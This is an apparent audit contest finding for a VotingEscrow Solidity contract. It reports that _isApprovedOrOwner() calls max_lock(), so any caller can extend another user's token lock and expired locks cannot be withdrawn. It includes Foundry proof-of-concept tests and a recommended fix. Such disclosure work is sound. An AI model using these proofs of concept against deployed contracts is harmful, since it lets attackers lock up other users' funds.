Proper Pineapple Hippo

High

# Incorrect Logic in _isApprovedOrOwner() Function Leads to Unintended Lock Extension, Allows Lock Manipulation and Prevents Expired Lock Withdrawals

## Summary
Incorrect logic in the `_isApprovedOrOwner()` function leads to multiple unwanted scenarios where the lock time for certain users is increased any time the function is called. In some cases, it prevents users whose locks have expired from withdrawing their locked tokens. This is due to the `max_lock()` function being called in `_isApprovedOrOwner()`.

## Vulnerability Detail
```solidity
function _isApprovedOrOwner(
        address _spender,
        uint _tokenId
    ) internal returns (bool) {
        max_lock(_tokenId); //@audit - this locks the token anytime the function is called
```
From the snippet above, the function first makes a call to `max_lock()` every time it is called. The `max_lock()` function on the other hand, sets the unlock time for a given tokenID to the max lock time (i.e 52 weeks or a year). This, however, only succeeds if the tokenID owner has enabled max lock for the tokenID (i. e `maxLockIdToIndex != 0`)  and the protocol has `max_lock_enabled` set to `true` (This is enabled by default). This is seen in the snippet below
```solidity

 bool public max_lock_enabled = true;

 ///@notice Extend the unlock time to max_lock_time for `_tokenId`
    function max_lock(uint _tokenId) public {
        if (maxLockIdToIndex[_tokenId] != 0 && max_lock_enabled) {
            LockedBalance memory _locked = locked[_tokenId];
            uint unlock_time = ((block.timestamp + MAXTIME) / WEEK) * WEEK; // Locktime is rounded down to weeks


 }
```

As `max_lock_enabled` is by default set to `true`, until it is disabled by the protocol, the issues highlighted here work with the assumption that `max_lock_enabled` is `true`. The issues start when a user who has enabled max lock on their tokenID performs any action which calls `_isApprovedOrOwner()` as the unlock time for that tokenID will always be refreshed to a year later. 
The following are some functions impacted by this vulnerability and it's effects:
- `withdraw()` : Unable to withdraw locked tokens due to `require(_locked.end > block.timestamp, "Lock expired");` being triggered in `max_lock()` for expired locked tokens
- `increase_amount()` : modifies the unlock time any time a maxlocked user wishes to increase their token balance which goes against the function comment below
```solidity
    /// @notice Deposit `_value` additional tokens for `_tokenId` without modifying the unlock time
```
- `disable_max_lock()`: Further extends the unlock time before disabling Max Lock
- `isApprovedOrOwner()`: external function that allows anyone to extend the lock time of the tokenID they input if the tokenID has maxLockEnabled.

The POC below shows some scenarios where this vulnerability is exploited or causes a DOS.
1. Unable to withdraw 
```solidity
    function testWithdrawExpiredMaxLockedTokens() public {
        flowDaiPair.approve(address(escrow), TOKEN_1);
        uint256 lockDuration = 7 * 24 * 3600; // 1 week

        // Balance should be zero before and 1 after creating the lock
        assertEq(escrow.balanceOf(address(owner)), 0);
        escrow.create_lock(TOKEN_1, lockDuration);
        assertEq(escrow.currentTokenId(), 1);
        assertEq(escrow.ownerOf(1), address(owner));
        assertEq(escrow.balanceOf(address(owner)), 1);

        //variables to log the locked amount and time
        int amount;
        uint lockTime;

        //enable max lock and set unlock to max lock time for tokenID 1
        escrow.enable_max_lock(1);
        escrow.max_lock(1);

        (amount, lockTime) = escrow.locked(1);
        //verify that the lock time is now 52 weeks
        assertEq(lockTime, 52 weeks);
        console.log("Original Unlock Time:", lockTime);

        //move forward in time 1 year
        vm.warp(block.timestamp + 52 weeks);
        //verify that lock has expired i.e block.timestamp > lockTime
        assertGt(block.timestamp, lockTime);

        // try to withdraw the locked tokens
        vm.expectRevert("Lock expired");
        escrow.withdraw(1);

        //try to disable max lock
        vm.expectRevert("Lock expired");
        escrow.disable_max_lock(1);

        // try to withdraw the locked tokens again
        vm.expectRevert("Lock expired");
        escrow.withdraw(1);
    }
```
[Logs]
```solidity
[PASS] testWithdrawExpiredMaxLockedTokens() (gas: 746854)
```
2. Maliciously increasing the unlock time
```solidity
function testIncreaseUnlockTimeMaliciously() public {
        address Attacker = vm.addr(6);
        flowDaiPair.approve(address(escrow), TOKEN_1);
        uint256 lockDuration = 7 * 24 * 3600; // 1 week

        // Balance should be zero before and 1 after creating the lock
        assertEq(escrow.balanceOf(address(owner)), 0);
        escrow.create_lock(TOKEN_1, lockDuration);
        assertEq(escrow.currentTokenId(), 1);
        assertEq(escrow.ownerOf(1), address(owner));
        assertEq(escrow.balanceOf(address(owner)), 1);

        //variables to log the locked amount and time
        int amount;
        uint lockTime;
        uint oldLockTime;

        //enable max lock and set unlock to max lock time for tokenID 1
        escrow.enable_max_lock(1);
        escrow.max_lock(1);

        (amount, lockTime) = escrow.locked(1);
        //verify that the lock time is now 52 weeks
        assertEq(lockTime, 52 weeks);
        console.log("Original Unlock Time:", lockTime);

        //move forward in time 1 month
        vm.warp(block.timestamp + 2 weeks);
        //verify that lock is still active i.e block.timestamp < lockTime
        assertLt(block.timestamp, lockTime);

        vm.prank(Attacker);
        //make a malicious call to increase the unlock time
        escrow.isApprovedOrOwner(address(owner), 1);

        (amount, lockTime) = escrow.locked(1);
        //verify that the lock time has been increased
        console.log("New unlock time is: ", lockTime);
        //verify that the lock time is greater than the old lock time after the attack
        assertGt(lockTime, oldLockTime);
    }
```
[Logs]
```solidity
Ran 1 test for test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] testIncreaseUnlockTimeMaliciously() (gas: 1026413)
Logs:
  Original Unlock Time: 31449600
  New unlock time is:  32659200
```

## Impact
As highlighted earlier, this vulnerability can lead to unintended lock extensions, lock manipulation by malicious actors and prevents withdrawals when the lock has expired.
## Code Snippet
https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L295-L296
## Tool used
Manual Review

## Recommendation
Remove `max_lock()` function in `_isApprovedOrOwner()`.